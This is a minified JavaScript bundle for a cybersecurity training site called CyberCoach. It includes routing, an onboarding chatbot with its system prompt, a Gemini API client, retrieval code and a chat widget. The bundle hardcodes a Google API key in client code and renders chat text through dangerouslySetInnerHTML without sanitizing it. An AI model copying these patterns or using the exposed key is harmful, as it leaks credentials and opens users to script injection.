w-4"}),cyber:!0,showPasswordToggle:!0})]}),e.jsx($t,{type:"submit",isLoading:c,className:"w-full h-12 bg-red-600 text-white hover:bg-red-500 font-black uppercase tracking-widest rounded-xl transition-all hover:shadow-[0_0_30px_rgba(239,68,68,0.4)] group border border-red-500/50",children:c?"Authenticating...":e.jsxs("span",{className:"flex items-center justify-center gap-2",children:["Override & Access ",e.jsx(Or,{className:"h-4 w-4 group-hover:translate-x-1 transition-transform"})]})})]}),e.jsx("div",{className:"mt-8 p-4 bg-red-500/5 border border-red-500/10 rounded-xl",children:e.jsxs("div",{className:"flex items-start gap-3",children:[e.jsx(ze,{className:"h-4 w-4 text-red-500 mt-0.5 flex-shrink-0"}),e.jsx("p",{className:"text-[9px] text-red-500/60 font-mono leading-tight uppercase tracking-wider",children:"Authorized personnel only. All access attempts are monitored by central intelligence. Unauthorized entry is a protocol violation."})]})})]})})},q2=()=>{const{user:a,loading:n,isAdmin:s,isTeacher:i}=Ie();return n?e.jsx("div",{className:"min-h-screen bg-black flex items-center justify-center",children:e.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-[#00FF88]"})}):e.jsxs(s1,{children:[e.jsx(Tr,{path:"/",element:a?i()?e.jsx(Er,{to:"/teacher",replace:!0}):s()?e.jsx(Er,{to:"/admin",replace:!0}):e.jsx(Gm,{}):e.jsx(fd,{})}),e.jsx(Tr,{path:"/login",element:a?e.jsx(Er,{to:"/",replace:!0}):e.jsx(B2,{})}),e.jsx(Tr,{path:"/signup",element:a?e.jsx(Er,{to:"/",replace:!0}):e.jsx(U2,{})}),e.jsx(Tr,{path:"/admin/login",element:a&&s()?e.jsx(Er,{to:"/admin",replace:!0}):e.jsx(z2,{})}),e.jsx(Tr,{path:"/dashboard",element:a?e.jsx(Gm,{initialTab:"dashboard"}):e.jsx(Er,{to:"/login",replace:!0})}),e.jsx(Tr,{path:"/teacher/*",element:a&&i()?e.jsx(cp,{}):e.jsx(Er,{to:"/login",replace:!0})}),e.jsx(Tr,{path:"/admin/*",element:a&&s()?e.jsx($2,{}):e.jsx(Er,{to:"/admin/login",replace:!0})}),e.jsx(Tr,{path:"*",element:e.jsx(Er,{to:"/",replace:!0})})]})},W2="AIzaSyDaqA3vQ1LI-pM-D4EWqK62BsqwNlBD1dQ",V2=`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${W2}`,H2=`You are the CyberCoach Onboarding Assistant, a friendly and helpful AI guide designed to help users navigate and understand the CyberCoach cybersecurity learning platform.

YOUR ROLE:
- Help new users understand how to get started with the platform
- Guide users to relevant features and learning resources
- Answer questions about courses, assessments, and platform functionality
- Make the onboarding experience smooth and welcoming
- Provide quick, clear, and actionable responses

PLATFORM FEATURES YOU SHOULD KNOW:
1. **Student Features:**
   - Interactive cybersecurity courses and labs
   - AI-powered chatbot for learning assistance
   - Technical assessments and quizzes
   - Progress tracking and achievements
   - Virtual interview preparation
   - Hands-on lab environments

2. **Course Categories:**
   - Network Security
   - Web Application Security (OWASP Top 10)
   - Cloud Security
   - Cryptography
   - Ethical Hacking
   - Security Frameworks (NIST, ISO)

3. **Getting Started Steps:**
   - Sign up or log in to access the platform
   - Browse available courses in different categories
   - Start with beginner-friendly courses if new to cybersecurity
   - Complete assessments to track your progress
   - Use the AI learning assistant during courses for help

4. **User Roles:**
   - Students: Access courses, labs, and assessments
   - Teachers: Create courses and manage student progress
   - Admin: Platform administration and analytics

YOUR PERSONALITY:
- Friendly and encouraging, but professional
- Patient with beginners
- Enthusiastic about cybersecurity education
- Clear and concise in explanations
- Proactive in suggesting next steps

GUIDELINES:
- Keep responses brief and actionable (2-4 sentences usually)
- Use emojis sparingly for a friendly touch
- When users ask vague questions, provide helpful suggestions
- Direct users to specific features when relevant
- If asked about technical cybersecurity topics, briefly explain and mention relevant courses
- Always encourage exploration and learning

RESPONSE EXAMPLES:
- If asked "How do I start?": Guide them to sign up/login and browse courses
- If asked "What courses do you have?": List main categories and suggest starting point
- If asked about specific topics: Briefly explain and mention if courses are available
- If asked about features: Explain the feature and how to access it

Remember: Your goal is to make users feel welcome and confident in navigating CyberCoach!`;class G2{conversationHistory=[];async sendMessage(n){try{this.conversationHistory.push({role:"user",parts:[{text:n}]});const s=[{role:"user",parts:[{text:H2}]},...this.conversationHistory],i=await fetch(V2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({contents:s,generationConfig:{temperature:.8,topK:40,topP:.95,maxOutputTokens:512},safetySettings:[{category:"HARM_CATEGORY_HARASSMENT",threshold:"BLOCK_MEDIUM_AND_ABOVE"},{category:"HARM_CATEGORY_HATE_SPEECH",threshold:"BLOCK_MEDIUM_AND_ABOVE"}]})});if(!i.ok){const d=await i.json();throw console.error("Gemini API error:",d),new Error(d.error?.message||"Failed to fetch from Gemini API")}const c=(await i.json()).candidates[0].content.parts[0].text;return this.conversationHistory.push({role:"model",parts:[{text:c}]}),this.conversationHistory.length>20&&(this.conversationHistory=this.conversationHistory.slice(-20)),c}catch(s){return console.error("Error in onboarding chat service:",s),this.getFallbackResponse(n)}}getFallbackResponse(n){const s=n.toLowerCase();return s.includes("start")||s.includes("begin")?"To get started with CyberCoach, simply sign up or log in to access our cybersecurity courses. Once you're in, browse our course catalog and choose a topic that interests you. Beginners often start with 'Introduction to Cybersecurity' or 'Network Security Basics'!":s.includes("course")||s.includes("learn")?"We offer courses in Network Security, Web Application Security (OWASP Top 10), Cloud Security, Cryptography, Ethical Hacking, and more! Each course includes interactive lessons, hands-on labs, and assessments to test your knowledge. What area interests you most?":s.includes("help")||s.includes("how")?"I'm here to help you navigate CyberCoach! You can ask me about getting started, available courses, how features work, or anything else about the platform. What would you like to know?":s.includes("assess")||s.includes("test")||s.includes("quiz")?"CyberCoach includes assessments and quizzes throughout courses to help you track your progress. You'll also find technical assessments and mock interview preparation tools. These help reinforce your learning and prepare you for real-world cybersecurity roles!":s.includes("lab")||s.includes("practice")?"Our hands-on labs give you practical experience with cybersecurity tools and techniques in a safe environment. You'll find labs integrated into most courses, covering topics like penetration testing, network analysis, and security configuration. Ready to get hands-on?":"Great question! CyberCoach is your complete cybersecurity learning platform with interactive courses, hands-on labs, and AI-powered assistance. You can start learning right away after signing up. Would you like to know about specific courses, features, or how to get started?"}clearHistory(){this.conversationHistory=[]}isGeminiEnabled(){return!0}}const Q2=new G2;class K2{table="notes";async upsertFacts(n,s){const i=s.map(c=>({admin_id:n,content:`[${c.kind}] ${c.topic?c.topic+": ":""}${c.text}`})),{error:o}=await Z.from(this.table).insert(i);return o?(console.warn("Memory store failed (falling back, non-fatal):",o),!1):!0}async getContext(n,s=10){try{const{data:i,error:o}=await Z.from(this.table).select("content, created_at").eq("admin_id",n).order("created_at",{ascending:!1}).limit(s);return o?(console.warn("Memory load failed (using empty context):",o),""):(i||[]).map(c=>c.content||"").join(`
`)}catch(i){const o=i instanceof Error?i.message:String(i);return console.warn("Memory load exception (using empty context):",o),""}}}const Y2=new K2;class J2{indexed=!1;chunks=[];async ensureIndexed(){if(!this.indexed)try{const n=await fetch("/docs/index.json"),s=n.ok?await n.json():[];for(const i of s){const o=`/docs/${i}`;i.toLowerCase().endsWith(".pdf")?await this.ingestPdf(o):i.toLowerCase().endsWith(".txt")||i.toLowerCase().endsWith(".md")?await this.ingestTextLike(o):await this.ingestPdf(o)}this.indexed=!0}catch(n){console.warn("RAG docs indexing failed:",n),this.indexed=!0}}async ingestPdf(n){try{const s=await pr(()=>import("./pdf-DUPavs6M.js"),[]);s?.GlobalWorkerOptions&&(s.GlobalWorkerOptions.workerSrc="/pdf.worker.min.js");const i=await s.getDocument(n).promise;for(let o=1;o<=i.numPages;o++){const d=await(await i.getPage(o)).getTextContent(),x=(Array.isArray(d.items)?d.items:[]).map(b=>b.str||"").join(" ").replace(/\s+/g," ").trim();if(!x)continue;const p=this.tokenize(x);this.chunks.push({doc:n,page:o,text:x,tokens:p})}}catch(s){console.warn("Failed to parse PDF via pdfjs. Skipping",n,s)}}async ingestTextLike(n){const s=await fetch(n);if(!s.ok)return;const o=(await s.text()).replace(/\s+/g," ").trim();if(!o)return;const c=this.tokenize(o);this.chunks.push({doc:n,page:1,text:o,tokens:c})}tokenize(n){return n.toLowerCase().replace(/[^a-z0-9\s]/g," ").split(/\s+/).filter(Boolean)}score(n,s){let i=0;const o=new Set(s.tokens);for(const c of n)o.has(c)&&i++;return i/Math.max(1,s.tokens.length)}async retrieveContext(n,s=4){if(await this.ensureIndexed(),this.chunks.length===0)return"";const i=this.tokenize(n);return this.chunks.map(c=>({c,s:this.score(i,c)})).sort((c,d)=>d.s-c.s).slice(0,s).map(c=>`Source: ${c.c.doc}#page=${c.c.page}
${c.c.text}`).join(`

`)}}const X2=new J2,Z2=a=>{let n=a.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>");return n=n.replace(/\*(.*?)\*/g,"<em>$1</em>"),n=n.replace(/\n/g,"<br>"),n=n.replace(/^(\d+)\.\s/gm,"<br>$1. "),n=n.replace(/^[-]\s/gm,"<br> "),n},eN=()=>{const{user:a}=Ie(),n=!!a,[s,i]=v.useState(!1),[o,c]=v.useState(!1),[d,m]=v.useState("chat"),[f,x]=v.useState(null),[p,b]=v.useState(null),[w,j]=v.useState(!1),N=()=>n?{role:"assistant",content:"Hello! I'm your advanced cybersecurity AI assistant. I can help you with detailed questions about security concepts, OWASP Top 10, penetration testing, and more. What would you like to explore?",timestamp:new Date}:{role:"assistant",content:" Hi! I'm your CyberCoach assistant. I'm here to help you navigate our platform and get started with your cybersecurity learning journey. How can I help you today?",timestamp:new Date},[k,F]=v.useState([N()]),[T,R]=v.useState(""),[S,U]=v.useState(!1),z=v.useRef(null),H=v.useRef(null),G=()=>{z.current?.scrollIntoView({behavior:"smooth"})};v.useEffect(()=>{G()},[k]),v.useEffect(()=>{s&&!o&&H.current?.focus()},[s,o]),v.useEffect(()=>{F([N()]),m("chat"),x(null),b(null),j(!1)},[n]);const O=async ie=>{n&&(x(ie),F([{role:"assistant",content:`Initializing ${ie.toUpperCase()} Interview Module... Stand by.`,timestamp:new Date}]),await V(ie))},V=async ie=>{U(!0);try{const ee=await _o.getNextQuestion(ie);ee?(b(ee),j(!0),F(M=>[...M,{role:"assistant",content:ee.question_text,timestamp:new Date}])):F(M=>[...M,{role:"assistant",content:"Error loading question. Please try again.",timestamp:new Date}])}catch(ee){console.error("Failed to load question",ee)}finally{U(!1)}},B=async ie=>{if(!p||!f)return;const ee={role:"user",content:ie,timestamp:new Date};F(M=>[...M,ee]),R(""),U(!0),j(!1);try{const M=await _o.validateAnswer(p,ie),W={role:"assistant",content:M.feedback,timestamp:new Date,type:"feedback",feedback:M};F(Q=>[...Q,W])}catch(M){console.error("Validation error",M)}finally{U(!1)}},ae=()=>{if(!n)return;const ie=d==="chat"?"interview":"chat";m(ie),x(null),b(null),j(!1),F([{role:"assistant",content:ie==="chat"?"Switched to Standard Chat Mode. How can I help you?":"Switched to Interview Simulation Mode. Select a category below.",timestamp:new Date}])},xe=async()=>{if(!T.trim()||S)return;if(n&&d==="interview"&&w){B(T);return}const ie={role:"user",content:T,timestamp:new Date};F(ee=>[...ee,ie]),R(""),U(!0);try{let ee;if(n){const W=a?.id?await Y2.getContext(a.id,8):"";let Q="";try{Q=await X2.retrieveContext(T,4)}catch(I){console.warn("RAG docs retrieval failed:",I)}const E=`${W?`User context:
${W}

`:""}${Q?`Relevant docs:
${Q}

`:""}Question: ${T}`;ee=await zs.chat(E,"You are a helpful cybersecurity tutor.")}else ee=await Q2.sendMessage(T);const M={role:"assistant",content:ee,timestamp:new Date};F(W=>[...W,M])}catch{const ee={role:"assistant",content:n?"I apologize, but I'm having trouble responding right now. Please try again in a moment.":"I apologize, but I'm having trouble responding right now. Please try again in a moment, or feel free to explore the platform on your own!",timestamp:new Date};F(M=>[...M,ee])}finally{U(!1)}},ye=ie=>{ie.key==="Enter"&&!ie.shiftKey&&(ie.preventDefault(),xe())},ne=()=>{s?c(!o):(i(!0),c(!1))},fe=()=>{i(!1),c(!1)};return s?e.jsxs("div",{className:`floating-chatbot-container ${o?"minimized":""}`,children:[e.jsxs("div",{className:"chatbot-header",children:[e.jsxs("div",{className:"chatbot-header-content",children:[e.jsx("div",{className:"chatbot-avatar",children:e.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:2,stroke:"currentColor",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M9.813 15.904L9 18.75l-.813-2.846a4.5 4.5 0 00-3.09-3.09L2.25 12l2.846-.813a4.5 4.5 0 003.09-3.09L9 5.25l.813 2.846a4.5 4.5 0 003.09 3.09L15.75 12l-2.846.813a4.5 4.5 0 00-3.09 3.09zM18.259 8.715L18 9.75l-.259-1.035a3.375 3.375 0 00-2.455-2.456L14.25 6l1.036-.259a3.375 3.375 0 002.455-2.456L18 2.25l.259 1.035a3.375 3.375 0 002.456 2.456L21.75 6l-1.035.259a3.375 3.375 0 00-2.456 2.456zM16.894 20.567L16.5 21.75l-.394-1.183a2.25 2.25 0 00-1.423-1.423L13.5 18.75l1.183-.394a2.25 2.25 0 001.423-1.423l.394-1.183.394 1.183a2.25 2.25 0 001.423 1.423l1.183.394-1.183.394a2.25 2.25 0 00-1.423 1.423z"})})}),e.jsxs("div",{className:"chatbot-title",children:[e.jsx("h3",{children:n&&d==="interview"?"Interview Simulator":"CyberCoach Assistant"}),e.jsxs("span",{className:"chatbot-status",children:[e.jsx("span",{className:"status-dot"}),n&&d==="interview"?"Interview Mode":"Online"]})]})]}),e.jsxs("div",{className:"chatbot-controls",children:[n&&e.jsx("button",{onClick:ae,className:"chatbot-mode-btn",title:d==="interview"?"Exit Interview":"Start Interview",children:d==="interview"?e.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:2,stroke:"currentColor",className:"w-5 h-5",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M8.25 9V5.25A2.25 2.25 0 0 1 10.5 3h6a2.25 2.25 0 0 1 2.25 2.25v13.5A2.25 2.25 0 0 1 16.5 21h-6a2.25 2.25 0 0 1-2.25-2.25V15m-3 0-3-3m0 0 3-3m-3 3H15"})}):e.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:2,stroke:"currentColor",className:"w-5 h-5",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M20.25 14.15v4.25c0 1.094-.787 2.036-1.872 2.18-2.087.277-4.216.42-6.378.42s-4.291-.143-6.378-.42c-1.085-.144-1.872-1.086-1.872-2.18v-4.25m16.5 0a2.18 2.18 0 0 0 .75-1.661V8.706c0-1.081-.768-2.015-1.837-2.175a48.114 48.114 0 0 0-3.413-.387m4.5 8.006c-.194.165-.42.295-.673.38A23.978 23.978 0 0 1 12 15.75c-2.648 0-5.195-.429-7.577-1.22a2.016 2.016 0 0 1-.673-.38m0 0A2.18 2.18 0 0 1 3 12.489V8.706c0-1.081.768-2.015 1.837-2.175a48.111 48.111 0 0 1 3.413-.387m7.5 0V5.25A2.25 2.25 0 0 0 13.5 3h-3a2.25 2.25 0 0 0-2.25 2.25v.894m7.5 0a48.667 48.667 0 0 0-7.5 0M12 12.75h.008v.008H12v-.008Z"})})}),e.jsx("button",{onClick:ne,className:"chatbot-control-btn","aria-label":"Minimize chat",children:e.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:2,stroke:"currentColor",className:"w-5 h-5",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M19.5 12h-15"})})}),e.jsx("button",{onClick:fe,className:"chatbot-control-btn","aria-label":"Close chat",children:e.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:2,stroke:"currentColor",className:"w-5 h-5",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M6 18L18 6M6 6l12 12"})})})]})]}),!o&&e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"chatbot-messages",children:[n&&d==="interview"&&!f&&e.jsxs("div",{className:"interview-categories",children:[e.jsxs("button",{onClick:()=>O("technical"),className:"interview-category-btn technical",children:[e.jsx("div",{className:"category-icon",children:""}),e.jsxs("div",{className:"category-info",children:[e.jsx("div",{className:"category-title",children:"Technical Round"}),e.jsx("div",{className:"category-desc",children:"Cybersecurity & Coding"})]})]}),e.jsxs("button",{onClick:()=>O("hr"),className:"interview-category-btn hr",children:[e.jsx("div",{className:"category-icon",children:""}),e.jsxs("div",{className:"category-info",children:[e.jsx("div",{className:"category-title",children:"HR Round"}),e.jsx("div",{className:"category-desc",children:"Behavioral & Culture Fit"})]})]}),e.jsxs("button",{onClick:()=>O("aptitude"),className:"interview-category-btn aptitude",children:[e.jsx("div",{className:"category-icon",children:""}),e.jsxs("div",{className:"category-info",children:[e.jsx("div",{className:"category-title",children:"Aptitude Round"}),e.jsx("div",{className:"category-desc",children:"Logic & Reasoning"})]})]})]}),k.map((ie,ee)=>e.jsxs("div",{className:`message ${ie.role==="user"?"message-user":"message-assistant"}`,children:[e.jsx("div",{className:"message-content",dangerouslySetInnerHTML:{__html:Z2(ie.content)}}),e.jsx("div",{className:"message-time",children:ie.timestamp.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})})]},ee)),S&&e.jsx("div",{className:"message message-assistant",children:e.jsx("div",{className:"message-content",children:e.jsxs("div",{className:"typing-indicator",children:[e.jsx("span",{}),e.jsx("span",{}),e.jsx("span",{})]})})}),e.jsx("div",{ref:z})]}),!n&&e.jsxs("div",{className:"chatbot-quick-actions",children:[e.jsx("button",{onClick:()=>R("How do I get started?"),className:"quick-action-btn",children:" Get Started"}),e.jsx("button",{onClick:()=>R("What courses are available?"),className:"quick-action-btn",children:" Browse Courses"}),e.jsx("button",{onClick:()=>R("How does the platform work?"),className:"quick-action-btn",children:" Platform Guide"})]}),n&&d==="interview"&&p&&e.jsx("div",{className:"chatbot-quick-actions",children:e.jsx("button",{onClick:()=>V(f),className:"quick-action-btn",children:" Next Question"})}),e.jsxs("div",{className:"chatbot-input-container",children:[e.jsx("input",{ref:H,type:"text",value:T,onChange:ie=>R(ie.target.value),onKeyPress:ye,placeholder:"Ask me anything about CyberCoach...",className:"chatbot-input",disabled:S}),e.jsx("button",{onClick:xe,disabled:!T.trim()||S,className:"chatbot-send-btn","aria-label":"Send message",children:e.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:2,stroke:"currentColor",className:"w-5 h-5",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M6 12L3.269 3.126A59.768 59.768 0 0121.485 12 59.77 59.77 0 013.27 20.876L5.999 12zm0 0h7.5"})})})]})]})]}):e.jsxs("button",{onClick:ne,className:"floating-chatbot-button","aria-label":"Open chat assistant",children:[e.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",strokeWidth:2,stroke:"currentColor",className:"w-6 h-6",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",d:"M8.625 12a.375.375 0 11-.75 0 .375.375 0 01.75 0zm0 0H8.25m4.125 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm0 0H12m4.125 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm0 0h-.375M21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 01-2.555-.337A5.972 5.972 0 015.41 20.97a5.969 5.969 0 01-.474-.065 4.48 4.48 0 00.978-2.025c.09-.457-.133-.901-.467-1.226C3.93 16.178 3 14.189 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25z"})}),e.jsx("span",{className:"chatbot-pulse"})]})},tN=()=>e.jsx(S1,{children:e.jsxs($v,{children:[e.jsx(q2,{}),e.jsx(eN,{})]})});gg.createRoot(document.getElementById("root")).render(e.jsx(v.StrictMode,{children:e.jsx(tN,{})}));export{md as _,pr as a,rN as c,Qm as g};
